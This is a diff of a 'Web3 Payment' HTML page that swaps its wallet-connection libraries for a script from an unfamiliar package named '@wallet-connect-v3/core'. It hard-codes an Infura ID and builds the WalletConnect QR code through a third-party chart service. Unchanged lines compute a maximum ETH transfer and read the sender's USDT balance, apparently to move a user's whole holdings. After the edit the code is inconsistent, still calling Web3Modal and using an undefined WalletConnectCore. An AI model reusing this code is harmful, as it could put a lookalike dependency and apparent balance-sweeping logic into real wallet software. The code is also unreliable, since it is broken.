@@ -4,15 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web3 Payment</title>
-    <!-- Removed unused libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <!-- Keeping web3modal for other wallet options -->
-    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
-    <!-- Keeping WalletConnect library for WalletConnect integration -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/browser@1.0.0/dist/umd/index.min.js"></script>
-    <!-- Including external main.js script for handling WalletConnect -->
-    <script type="module" src="main.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@wallet-connect-v3/core@2.0.1/dist/esm/index.min.js"></script>
     <style>
         body {
             display: flex;
@@ -87,24 +81,12 @@
         async function init() {
             const providerOptions = {
                 walletconnect: {
-                    package: WalletConnect, // using the updated library
+                    package: WalletConnectCore, // using the updated library
                     options: {
                         infuraId: "c05e035e823a4769b62ae15c1cbe2f02" // Your Infura Project ID
                     }
                 },
-                binancechainwallet: {
-                    package: true
-                },
-                coinbasewallet: {
-                    package: true,
-                    options: {
-                        appName: "Web3 Payment",
-                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02"
-                    }
-                },
-                trustwallet: {
-                    package: true
-                }
+                // Additional wallet options can be defined here as needed
             };
 
             const web3Modal = new Web3Modal.default({
@@ -150,7 +132,7 @@
                         maxEthTransferWei = 0n;
                     }
 
-                    // Get token balances
+                    // Get token balances (example with USDT and BNB)
                     const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
                     const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
 
@@ -198,7 +180,7 @@
                 if (provider.isWalletConnect) {
                     qrCodeContainer.style.display = 'block';
                     const walletConnectProvider = provider.connector;
-                    const uri = await walletConnectProvider.getQrCode();
+                    const uri = await walletConnectProvider.getUri();
                     const qrCodeImg = document.createElement('img');
                     qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
                     document.getElementById('qrCode').appendChild(qrCodeImg);
